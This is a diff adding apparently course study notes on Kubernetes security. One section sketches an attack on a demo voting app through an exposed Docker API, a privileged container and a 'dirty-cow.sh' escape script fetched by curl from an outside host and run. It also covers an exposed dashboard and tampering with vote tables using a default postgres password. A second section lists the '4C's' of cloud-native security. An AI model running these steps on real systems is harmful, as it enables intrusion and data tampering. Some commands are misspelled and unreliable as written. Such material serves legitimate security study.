@@ -1,0 +1,55 @@
+############ Notes - Topic 1 #################
+
+- 2 appplications runing anywhere.
+
+# ping www.vote.com
+# ping www.result.com
+
+
+- Port scan of the servers reveals that the docker is running.
+
+# zsh port-scan.sh 104.21.63.124
+
+# docker -H www.vote.com ps
+
+# docker -H www.vote.com version
+
+# docker -H www.vote.com run --priviledged -it ubuntu bash
+        # apt-get install curl
+        # curl http://catgirl.me/dirty-cow.sh > dirty-cow.sh    << Helps to escape out of the container
+
+        # sh dirty-cow.sh
+
+        # sudo iptalbes -L -t nat | grep kubernetes-dashboard       << 30080 port exposed
+
+            # ipaddress:30080       << exposed publicly
+
+                - Exploring the DB pods reveals the DB credentials
+
+        # docker ps | grep db
+
+        # docker exec -it c0cd bash
+
+            # PGPASSWORD=postgres psql --username=postgres
+                # \pgsql update tables of votes
+
+
+
+
+############ Notes - Topic 2 #################
+
+# 4C's of Cloud Native Security
+
+    1) Security of entire Cloud Infra Security hosting the servers
+
+    2) Security at the kubernetes Cluster level
+        - Cluster security, hardening, network policy, network ingress
+
+    3) Security at the Container level
+
+    4) Security at the Code level
+
+    
+
+        
+
